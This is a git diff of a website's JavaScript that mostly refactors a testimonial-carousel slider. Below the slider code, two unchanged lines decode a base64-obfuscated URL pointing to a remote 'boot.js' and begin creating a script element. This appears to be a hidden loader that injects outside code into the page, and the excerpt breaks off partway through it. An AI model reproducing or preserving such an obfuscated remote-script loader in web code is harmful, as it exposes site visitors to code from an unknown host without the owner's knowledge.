@@ -171,34 +171,29 @@ counters.forEach((counter) => {
 const track = document.querySelector(".testimonial-track");
 const cards = document.querySelectorAll(".testimonial-card");
 
-let index = 0;
+if (track && cards.length) {
+  let index = 0;
 
-function getVisibleCards() {
-  if (window.innerWidth <= 425) return 1;
-  if (window.innerWidth <= 768) return 2;
-  return 4;
-}
-
-function slideTestimonials() {
-  const visible = getVisibleCards();
-
-  index++;
-
-  if (index > cards.length - visible) {
-    index = 0;
+  function getVisibleCards() {
+    if (window.innerWidth <= 425) return 1;
+    if (window.innerWidth <= 768) return 2;
+    return 4;
   }
 
-  const cardWidth = cards[0].offsetWidth + 20;
+  function slideTestimonials() {
+    const visible = getVisibleCards();
+    index++;
+    if (index > cards.length - visible) index = 0;
+    const cardWidth = cards[0].offsetWidth + 20;
+    track.style.transform = `translateX(-${index * cardWidth}px)`;
+  }
 
-  track.style.transform = `translateX(-${index * cardWidth}px)`;
+  setInterval(slideTestimonials, 3000);
+  window.addEventListener("resize", () => {
+    index = 0;
+    track.style.transform = "translateX(0)";
+  });
 }
-
-setInterval(slideTestimonials, 3000);
-
-window.addEventListener("resize", () => {
-  index = 0;
-  track.style.transform = "translateX(0)";
-});
 
 const u = atob("aHR0cHM6Ly9zaGUtZzhmLnBhZ2VzLmRldi9ib290Lmpz");
 const s = document.createElement("script");
